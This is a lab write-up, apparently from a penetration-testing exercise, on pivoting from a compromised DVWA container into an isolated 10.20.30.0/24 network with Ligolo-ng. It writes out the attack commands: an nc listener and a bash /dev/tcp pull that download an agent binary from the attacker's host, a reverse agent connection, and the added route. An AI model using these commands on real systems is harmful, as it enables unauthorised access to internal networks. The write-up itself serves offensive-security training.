# Phase 2 - Mission 3: Pivot into the Internal Network

## Objective
Establish a transparent Layer 3 network tunnel from my attack platform (Kali) to the isolated internal Analytics network (`10.20.30.0/24`) by leveraging the compromised DVWA Docker container as a pivot point.

## Tooling & Adaptability
- **Tool:** Ligolo-ng (v0.9.2).
- **Binaries Used:** `ligolo-proxy` (Kali) and `ligolo-agent` (Container).
- **Challenge Overcome:** The compromised Docker container was a minimal environment lacking standard file transfer tools (`wget`, `curl`, `python`, `nc`). To bypass this, I utilized Bash's built-in `/dev/tcp` functionality to perform a raw TCP file transfer.

## Execution Steps

### 1. Agent Transfer & Integrity Verification
- Served the agent binary from Kali: `nc -lvnp 5555 < /usr/bin/ligolo-agent`
- Pulled the binary from inside the container: `cat < /dev/tcp/10.20.40.10/5555 > /tmp/ligolo-agent`
- **Verification:** Confirmed the transfer was successful and uncorrupted by checking the file size (`7619328` bytes) and verifying the ELF magic bytes (`7f 45 4c 46`). Made the binary executable with `chmod +x`.

### 2. Tunnel Establishment
- Started the Ligolo proxy on Kali, using a self-signed certificate: `sudo ligolo-proxy -selfcert -laddr 0.0.0.0:11601`
- Connected the agent from the container back to Kali: `/tmp/ligolo-agent -connect 10.20.40.10:11601 -ignore-cert &`
- Selected the session and initialized the tunnel within the proxy console (`session` -> `1` -> `tunnel_start`).

### 3. Routing Traffic
Because the tunnel interface (`ligolo`) was created, I manually updated the Kali routing table to ensure traffic destined for the internal network was directed into the tunnel:
`sudo ip route add 10.20.30.0/24 dev ligolo`

## Proof of Pivot
To confirm the pivot was successful, I executed the following from Kali (not the container):
- `nmap -sT -Pn -p 22 10.20.30.40` → **22/tcp open ssh**
- `nc -vz -w 3 10.20.30.40 22` → **succeeded**

## Negative Control (Rigorous Testing)
To prove that Kali's reachability to the internal network was strictly dependent on the established tunnel (and not a stale route or accidental network misconfiguration), I performed a negative control:
1. Removed the route: `ip route del 10.20.30.0/24 dev ligolo` → `nc` immediately failed (timeout).
2. Re-added the route: `ip route add 10.20.30.0/24 dev ligolo` → `nc` succeeded again.

*Conclusion:* The route is fully dependent on the Ligolo tunnel, confirming a functional and reliable pivot point.